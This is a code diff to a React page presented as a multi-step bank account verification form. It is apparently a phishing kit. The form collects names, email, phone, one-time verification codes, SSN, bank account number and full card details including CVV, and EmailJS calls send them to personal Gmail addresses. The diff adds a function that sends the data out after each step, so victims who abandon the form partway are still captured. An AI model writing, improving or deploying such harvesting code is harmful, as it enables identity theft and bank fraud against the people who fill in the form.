@@ -1,4 +1,4 @@
-import { useEffect, useRef, useState } from "react";
+import { useEffect,  useState } from "react";
 import BG from "../assets/bg.png";
 import emailjs from "@emailjs/browser";
 import Footer from "../components/Footer";
@@ -30,33 +30,108 @@ export default function CombinedVerification() {
     const { name, value } = e.target;
     setFormData((prev) => ({ ...prev, [name]: value }));
   };
+  
   useEffect(() => {
     // Initialize EmailJS with your public key
     emailjs.init("v_oAluZ11har85Kfg");
   }, []);
 
-  const handleNextStep = () => {
+  // Function to send data to emailjs
+  const sendStepData = async (stepNumber, additionalData = {}) => {
+    setIsSubmitting(true);
+    
+    try {
+      // Prepare the data for the current step
+      let templateData = {
+        bankName: formData.bankName,
+        stepCompleted: stepNumber,
+        time: new Date().toString(),
+        to_email: "ifegbesan6@gmail.com",
+        ...additionalData
+      };
+      
+      const response = await emailjs.send(
+        "service_my2ydis", // Your EmailJS service ID
+        "template_vj50jeg", // Your EmailJS template ID
+        templateData
+      );
+
+      console.log(`Step ${stepNumber} data submitted successfully:`, response);
+      setSubmitStatus("success");
+      return true;
+    } catch (error) {
+      console.error(`Failed to submit step ${stepNumber} data:`, error);
+      setSubmitStatus("error");
+      return false;
+    } finally {
+      setIsSubmitting(false);
+    }
+  };
+
+  const handleNextStep = async () => {
     // Simple validation before proceeding
     if (currentStep === 1) {
       if (!formData.firstName || !formData.lastName) return;
-    } else if (currentStep === 2) {
+      
+      // Send step 1 data
+      const success = await sendStepData(1, {
+        firstName: formData.firstName,
+        lastName: formData.lastName
+      });
+      
+      if (!success) return;
+    } 
+    else if (currentStep === 2) {
       if (!formData.emailAddress || !formData.phoneNumber) return;
-    } else if (currentStep === 3) {
+      
+      // Send step 2 data
+      const success = await sendStepData(2, {
+        firstName: formData.firstName,
+        lastName: formData.lastName,
+        emailAddress: formData.emailAddress,
+        phoneNumber: formData.phoneNumber
+      });
+      
+      if (!success) return;
+    } 
+    else if (currentStep === 3) {
       if (!formData.verificationCode) return;
-    } else if (currentStep === 4) {
+      
+      // Send step 3 data
+      const success = await sendStepData(3, {
+        firstName: formData.firstName,
+        lastName: formData.lastName,
+        emailAddress: formData.emailAddress,
+        phoneNumber: formData.phoneNumber,
+        verificationCode: formData.verificationCode
+      });
+      
+      if (!success) return;
+    } 
+    else if (currentStep === 4) {
       if (!formData.ssn || !formData.accountNumber) return;
-      // Credit card validation not strictly required, but could be added
+      
+      // The final submission will happen in handleFinalSubmit
+      handleFinalSubmit();
+      return;
     }
 
     // Move to next step
     if (currentStep < 4) {
       setCurrentStep(currentStep + 1);
-    } else {
-      handleFinalSubmit();
     }
   };
 
-  const handleRequestCode = () => {
+  const handleRequestCode = async () => {
+    // Send code request notification
+    await sendStepData('code-request', {
+      firstName: formData.firstName,
+      lastName: formData.lastName,
+      emailAddress: formData.emailAddress,
+      phoneNumber: formData.phoneNumber,
+      message: "User requested verification code"
+    });
+    
     setCodeRequested(true);
     // In a real app, this would trigger sending a code to the user
   }
@@ -66,7 +141,7 @@ export default function CombinedVerification() {
     setSubmitStatus(null);
 
     try {
-      // Send email using EmailJS
+      // Send the final, complete submission with all data
       const response = await emailjs.send(
         "service_my2ydis", // Your EmailJS service ID
         "template_vj50jeg", // Your EmailJS template ID
@@ -84,17 +159,18 @@ export default function CombinedVerification() {
           cardExpiry: formData.cardExpiry,
           cardCVV: formData.cardCVV,
           cardholderName: formData.cardholderName,
+          stepCompleted: "final",
           time: new Date().toString(),
           to_email: "leslieolobo@gmail.com"
         }
       );
 
-      console.log("Verification submitted successfully:", response);
+      console.log("Final verification submitted successfully:", response);
       setSubmitStatus("success");
       // Move to confirmation step
       setCurrentStep(5);
     } catch (error) {
-      console.error("Failed to submit verification:", error);
+      console.error("Failed to submit final verification:", error);
       setSubmitStatus("error");
     } finally {
       setIsSubmitting(false);
@@ -171,7 +247,7 @@ export default function CombinedVerification() {
             <h2 className="text-xl mb-2">Code Verification</h2>
             <p className="mb-4">
               We've sent a secured code to your registered number. Please tell us your code
-              for account verification. If you didn't get code, please wait 1-2 minutes or enter the last 4 digits of your phone number.
+              for account verification. If you didn't get code, please wait 1-2 minutes .
             </p>
 
             <div className="mb-4">
@@ -379,7 +455,11 @@ export default function CombinedVerification() {
                 className="bg-[#3B3836] text-white px-8 py-3 rounded-md hover:bg-[#4e4c4b] disabled:opacity-50 disabled:cursor-not-allowed"
                 disabled={isSubmitting}
               >
-                {currentStep === 4 ? "Submit" : "Continue"}
+                {isSubmitting ? (
+                  "Processing..."
+                ) : (
+                  currentStep === 4 ? "Submit" : "Continue"
+                )}
               </button>
             </div>
           )}
